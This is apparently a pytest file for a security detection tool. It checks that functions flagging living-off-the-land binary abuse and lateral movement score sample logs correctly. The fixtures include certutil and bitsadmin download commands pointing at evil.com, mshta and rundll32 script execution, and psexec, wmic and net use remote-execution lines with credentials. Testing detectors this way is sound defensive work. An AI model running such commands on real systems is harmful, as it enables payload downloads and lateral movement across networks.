"""
Cycle 7 Detection Tool Tests — Track 6
Tests for detect_lolbin_abuse, detect_lateral_movement
"""
import sys
import os

_HERE = os.path.dirname(os.path.abspath(__file__))
_WORKER = os.path.abspath(os.path.join(_HERE, ".."))
if _WORKER not in sys.path:
    sys.path.insert(0, _WORKER)

import pytest
from tools.detection import detect_lolbin_abuse, detect_lateral_movement


class TestLolbinAbuseDetection:
    """Tests for detect_lolbin_abuse tool"""
    
    def test_certutil_download_detected(self):
        """Must detect certutil download"""
        event = {"raw_log": "certutil.exe -urlcache -split -f http://evil.com/payload.exe"}
        result = detect_lolbin_abuse(event)
        assert result["risk_score"] >= 50, f"Expected risk >=50, got {result['risk_score']}"
    
    def test_mshta_javascript_detected(self):
        """Must detect mshta javascript execution"""
        event = {"raw_log": "mshta.exe javascript:alert('test')"}
        result = detect_lolbin_abuse(event)
        assert result["risk_score"] >= 50, f"Expected risk >=50, got {result['risk_score']}"
    
    def test_rundll32_javascript_detected(self):
        """Must detect rundll32 javascript execution"""
        event = {"raw_log": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \""}
        result = detect_lolbin_abuse(event)
        assert result["risk_score"] >= 50, f"Expected risk >=50, got {result['risk_score']}"
    
    def test_bitsadmin_download_detected(self):
        """Must detect bitsadmin download"""
        event = {"raw_log": "bitsadmin.exe /transfer job /download /priority high http://evil.com/file.exe C:\\temp\\file.exe"}
        result = detect_lolbin_abuse(event)
        assert result["risk_score"] >= 50, f"Expected risk >=50, got {result['risk_score']}"
    
    def test_certutil_verify_benign(self):
        """Must not flag benign certutil usage"""
        event = {"raw_log": "certutil.exe -verify mycert.crt"}
        result = detect_lolbin_abuse(event)
        assert result["risk_score"] < 50, f"Expected benign risk <50, got {result['risk_score']}"


class TestLateralMovementDetection:
    """Tests for detect_lateral_movement tool"""
    
    def test_smb_admin_share_detected(self):
        """Must detect SMB admin share access"""
        event = {
            "raw_log": "net use \\10.0.0.50\\ADMIN$ /user:DOMAIN\\admin P@ssw0rd!",
            "source_ip": "10.0.0.51",
            "destination_ip": "10.0.0.50"
        }
        result = detect_lateral_movement(event)
        assert result["risk_score"] >= 50, f"Expected risk >=50, got {result['risk_score']}"
    
    def test_psexec_detected(self):
        """Must detect PsExec usage"""
        event = {
            "raw_log": "psexec.exe \\10.0.0.52 -u admin -p password cmd.exe",
            "source_ip": "10.0.0.53",
            "destination_ip": "10.0.0.52"
        }
        result = detect_lateral_movement(event)
        assert result["risk_score"] >= 50, f"Expected risk >=50, got {result['risk_score']}"
    
    def test_wmic_remote_detected(self):
        """Must detect WMI remote execution"""
        event = {
            "raw_log": "wmic /node:10.0.0.54 process call create 'malware.exe'",
            "source_ip": "10.0.0.55",
            "destination_ip": "10.0.0.54"
        }
        result = detect_lateral_movement(event)
        assert result["risk_score"] >= 50, f"Expected risk >=50, got {result['risk_score']}"
    
    def test_scp_remote_detected(self):
        """Must detect SCP to remote host"""
        event = {
            "raw_log": "scp file.txt user@10.0.0.56:/tmp/",
            "source_ip": "10.0.0.57",
            "destination_ip": "10.0.0.56"
        }
        result = detect_lateral_movement(event)
        assert result["risk_score"] >= 50, f"Expected risk >=50, got {result['risk_score']}"
    
    def test_local_access_benign(self):
        """Must not flag normal local access"""
        event = {
            "raw_log": "Normal file access to local share",
            "source_ip": "10.0.0.58"
        }
        result = detect_lateral_movement(event)
        assert result["risk_score"] < 50, f"Expected benign risk <50, got {result['risk_score']}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
